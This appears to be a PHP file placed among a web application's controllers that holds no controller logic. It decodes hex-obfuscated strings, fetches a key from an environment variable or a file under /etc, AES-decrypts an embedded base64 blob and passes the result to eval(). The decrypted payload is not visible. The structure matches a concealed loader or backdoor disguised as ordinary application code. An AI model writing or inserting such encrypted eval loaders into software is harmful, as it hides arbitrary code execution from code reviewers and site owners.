<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('+T4K9sqsssaASIXuk6zvpw==');

$c=base64_decode(

'GdjZTJOTzfbqjpmQJ8j5V8lAllx+NmO9QAc+uopeuACij8sjaWxPn9d64Sf+dEoM6hJ8BxAL4fi7' .
'Q+fqZdiZJc1kK6VHM0v8TH6Ju+O2l00Lyoa8ac7hU0EcWsv9qRy0loGs6nZ4Du6P5Jdmwm5+gPsC' .
'SvEjtNjFhGWN5cz15qzh3OIyNn3QS4W2ukIw+OkMUReZty3mr3mwZh291hNM/nwAsrg3qcyfIL07' .
'wASp0M0yW6dxZDsdHrp+xjpkBUuj'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

